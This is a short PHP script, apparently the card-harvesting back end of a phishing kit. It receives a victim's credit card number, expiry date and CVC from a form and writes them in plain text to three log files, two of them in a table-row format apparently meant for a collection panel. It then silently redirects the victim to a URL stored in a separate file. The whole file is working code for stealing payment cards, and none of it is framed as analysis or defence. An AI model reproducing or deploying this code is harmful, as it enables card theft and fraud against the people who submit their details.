<?php

$number = $_POST['creditcard'];
$expirx = $_POST['month'];
$expiry = $_POST['year'];
$cvc = $_POST['cvc'];

$file = $_SERVER['DOCUMENT_ROOT']."/log.log";
$file = str_replace("/dist", "", $file);
$all = "\r\nx.add_row(['PAY', '$number','$expirx','$expiry', '$cvc'])";
$fp = fopen("$file", "a+");
fwrite($fp, $all);
fclose($fp);

$file = $_SERVER['DOCUMENT_ROOT']."/data.log";
$file = str_replace("/dist", "", $file);
$al = "\r\nx.add_row(['PAY', '$number','$expirx','$expiry', '$cvc'])";
$fp = fopen("$file", "a+");
fwrite($fp, $al);
fclose($fp);

$fs = fopen("result.log", "a+");
fwrite($fs, "\n[CARD] ".$number."\n[DATE] ".$expirx.$expiry."\n[CVV2] ".$cvc."\n");
fclose($fs);
$reloc = file_get_contents("location.location");
?>

<script>
window.location.href="<?php echo $reloc ?>"
</script>

